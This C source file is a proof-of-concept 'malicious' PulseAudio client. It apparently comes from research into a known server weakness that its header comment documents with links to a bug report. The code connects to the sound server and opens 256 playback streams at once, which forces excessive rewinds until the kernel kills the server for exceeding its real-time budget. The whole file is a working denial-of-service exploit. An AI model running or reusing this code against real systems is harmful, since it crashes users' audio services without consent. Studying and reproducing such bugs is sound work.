/*
 * Malicious PA client: Kill the server
 *
 * Copyright (C) 2016 Ahmed S. Darwish <darwish.07@gmail.com>
 *
 * SPDX-License-Identifier: GPL-2.0+
 *
 * Kill the server by quickly opening, and writing to, multiple connected
 * streams in parallel. This will force excessive rewinds in the server,
 * leading it to exceed its 200ms rtkit-allocated real-time budged, and
 * thus getting killed by the kernel.
 *
 * For further details, check:
 *
 * - Timing issues in desktop audio playback infrastructure, Linux Audio
 *   Conference 2015, Alexander Patrakov
 *   http://lac.linuxaudio.org/2015/download/rewind-slides.pdf
 *
 * - PA Bugzilla: PulseAudio gets reliably killed upon a big number of
 *   client connections
 *   https://bugs.freedesktop.org/show_bug.cgi?id=94629
 *
 * - PA Access Control document
 *   https://www.freedesktop.org/wiki/Software/PulseAudio/Documentation/Developer/AccessControl/
 */

#include <assert.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <pulse/context.h>
#include <pulse/error.h>
#include <pulse/mainloop.h>
#include <pulse/mainloop-api.h>
#include <pulse/mainloop-signal.h>
#include <pulse/operation.h>
#include <pulse/proplist.h>
#include <pulse/sample.h>
#include <pulse/stream.h>

#include "common.h"

/*
 * Context sent to all of our asynchronous callbacks
 */
struct context {
    pa_mainloop_api *mainloop_api;      /* Pulse abstract mainloop API vtable */
    struct audio_file *file;            /* Audio file buf, size, audio specs, etc. */
    pa_context *context;                /* PA Connection handle between client & server */
};

/*
 * Gracefully stop PA event loop before exit
 */
static void quit(struct context *ctx, int ret) {
    assert(ctx->mainloop_api);
    assert(ret == EXIT_SUCCESS || ret == EXIT_FAILURE);

    ctx->mainloop_api->quit(ctx->mainloop_api, ret);
    exit(ret);
}

/*
 * Stream state callbacks
 *
 * A 'stream' represents a data path between the client and server.
 * Sample streams include a playback stream, a recording stream, or
 * a file upload stream.
 *
 * A single client-server connection ('context') can have multiple
 * streams. Each stream can have its own latency and time fragment
 * requirements through PulseAudio buffer attributes. A stream can
 * be moved to a different sink during its lifetime.
 */
static void stream_state_callback(pa_stream *stream, void *userdata) {
    struct context *ctx = userdata;

    assert(ctx);
    assert(ctx->context);

    switch (pa_stream_get_state(stream)) {
    case PA_STREAM_CREATING:
    case PA_STREAM_TERMINATED:
        break;

    case PA_STREAM_READY:
        out("Playback stream succesfully created");
        break;

    case PA_STREAM_FAILED:
    default:
        error("Playback stream error: %s",
              pa_strerror(pa_context_errno(ctx->context)));
        goto fail;
    }

    return;

fail:
    quit(ctx, EXIT_FAILURE);
}

/*
 * Exit the application only after getting a confirmation that
 * the playback stream has been _fully_ drained. Check
 * below stream_write_callback() EOF handling for rationale.
 */
static void stream_drain_complete(pa_stream*s, int success, void *userdata) {
    struct context *ctx = userdata;

    out("Playback stream fully drained.. Exiting application");
    quit(ctx, EXIT_SUCCESS);
}

/*
 * Callback to be called whenever new data may be written to the
 * playback data stream
 */
static void stream_write_callback(pa_stream *stream, size_t length, void *userdata) {
    struct context *ctx = userdata;
    struct audio_file *file;
    struct pa_operation *operation;
    size_t to_write, write_unit;
    int ret;

    assert(ctx);
    assert(ctx->context);
    assert((file = ctx->file));
    assert(file->buf);
    assert(file->readi <= file->size);

    /* Writes must be in multiple of audio sample size * channel count */
    write_unit = pa_frame_size(&file->spec);

    to_write = file->size - file->readi;
    to_write = min(length, to_write);
    to_write -= (to_write % write_unit);

    ret = pa_stream_write(stream, &file->buf[file->readi], to_write, NULL, 0,
                          PA_SEEK_RELATIVE);
    if (ret < 0) {
        error("Failed writing audio data to stream: %s",
              pa_strerror(pa_context_errno(ctx->context)));
        goto fail;
    }

    file->readi += to_write;
    assert(file->readi <= file->size);

    /*
     * EOF! yay ..
     *
     * When reaching audio EOF, do not just close the application!
     * Doing so leads to losing playback of the latest portion of
     * the audio file (~ 0.5 seconds). Moreover, it produces ugly,
     * quite loud, sound cracks :-(
     *
     * The playback stream needs to be drained first. Thus close
     * the application, and the PA event loop, only after getting
     * a confirmation that the stream drain is complete.
     */
    if ((file->size - file->readi) < write_unit) {
        out("Success! - Reached end of file");
        out("Draining playback stream before exit");

        /* Don't invoke our write callback again */
        pa_stream_set_write_callback(stream, NULL, NULL);

        operation = pa_stream_drain(stream, stream_drain_complete, ctx);
        if (!operation) {
            error("Could not drain playback stream: %s",
                  pa_strerror(pa_context_errno(ctx->context)));
            goto fail;
        }
    }

    return;

fail:
    quit(ctx, EXIT_FAILURE);
}

/*
 * Context state callbacks
 *
 * A 'context' represents the connection handle between a PulseAudio
 * client and its server. It multiplexes everything in that connection
 * including data streams , bi-directional commands, and events.
 */
static void context_state_callback(pa_context *context, void *userdata) {
    struct context *ctx = userdata;
    struct audio_file *file;
    pa_stream *stream;
    int ret;

    assert(ctx);
    assert((file = ctx->file));

    switch (pa_context_get_state(context)) {
    case PA_CONTEXT_AUTHORIZING:
    case PA_CONTEXT_CONNECTING:
    case PA_CONTEXT_SETTING_NAME:
        break;

    case PA_CONTEXT_READY:
        out("Connection established with PulseAudio sound server");

        for (int i = 0; i < 256; i++) {
            stream = pa_stream_new(context, "playback stream", &file->spec, NULL);
            if (!stream)
                goto fail;

            pa_stream_set_state_callback(stream, stream_state_callback, userdata);
            pa_stream_set_write_callback(stream, stream_write_callback, userdata);

            /* Connect this stream with a sink chosen by PulseAudio */
            ret = pa_stream_connect_playback(stream, NULL, NULL, 0, NULL, NULL);
            if (ret < 0) {
                error("pa_stream_connect_playback() failed: %s",
                        pa_strerror(pa_context_errno(context)));
                goto fail;
            }
        }

        break;

    case PA_CONTEXT_TERMINATED:
        exit(EXIT_SUCCESS);
        break;

    case PA_CONTEXT_FAILED:
    default:
        error("PulseAudio context connection failure: %s",
              pa_strerror(pa_context_errno(context)));
        goto fail;
    }

    return;

fail:
    quit(ctx, EXIT_FAILURE);
}

int main(int argc, char **argv) {
    pa_proplist *proplist = NULL;
    pa_mainloop *m = NULL;
    pa_mainloop_api *api = NULL;
    pa_context *context = NULL;
    struct context *ctx;
    struct audio_file *file;
    int ret;

    ctx = malloc(sizeof(struct context));
    if (!ctx) {
        errorp("Couldn't allocate async callbacks context");
        goto quit;
    }

    memset(ctx, 0, sizeof(*ctx));

    file = audio_file_new("samples/sample.wav");
    if (!file)
        goto quit;

    proplist = pa_proplist_new();
    if (!proplist) {
        error("Couldn't create a PulseAudio property list");
        goto quit;
    }

    pa_proplist_sets(proplist, PA_PROP_APPLICATION_NAME, "malicious-client-kill-server");

    m = pa_mainloop_new();
    if (!m) {
        error("Couldn't create PulseAudio mainloop");
        goto quit;
    }

    api = pa_mainloop_get_api(m);
    context = pa_context_new_with_proplist(api, NULL, proplist);
    if (!context) {
        error("Couldn't create client context");
        goto quit;
    }

    ctx->file = file;
    ctx->mainloop_api = api;
    ctx->context = context;
    pa_context_set_state_callback(context, context_state_callback, ctx);

    ret = pa_context_connect(context, NULL, 0, NULL);
    if (ret < 0) {
        error ("Couldn't connect to PulseAudio server: %s",
               pa_strerror(pa_context_errno(context)));
        goto quit;
    }

    pa_mainloop_run(m, &ret);

    return ret;

 quit:
     exit(EXIT_FAILURE);
}
